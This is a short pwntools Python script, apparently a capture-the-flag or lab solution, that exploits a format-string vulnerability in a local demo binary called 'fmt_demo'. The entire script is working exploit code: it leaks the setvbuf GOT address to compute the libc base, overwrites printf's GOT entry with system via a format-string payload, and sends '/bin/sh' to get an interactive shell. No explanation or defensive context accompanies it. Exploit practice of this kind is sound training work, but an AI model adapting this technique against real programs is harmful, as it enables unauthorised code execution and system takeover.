from pwn import *

p = process("./fmt_demo")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
elf = ELF("./fmt_demo")
gdb.attach(p,"b printf")

p1 = p32(elf.got["setvbuf"]) + "%4$s"
p.send(p1.ljust(0x100,"\x00"))
leak_addr = u32(p.recv(8)[4:8])
libc.address = leak_addr - libc.symbols["setvbuf"]
log.success("libc_base:" + hex(libc.address))

p2 = fmtstr_payload(offset = 4,writes = {elf.got["printf"]:libc.symbols["system"]})
p.send(p2.ljust(0x100,"\x00"))

p3 = "/bin/sh"
p.sendline(p3.ljust(0x100,"\x00"))

p.interactive()
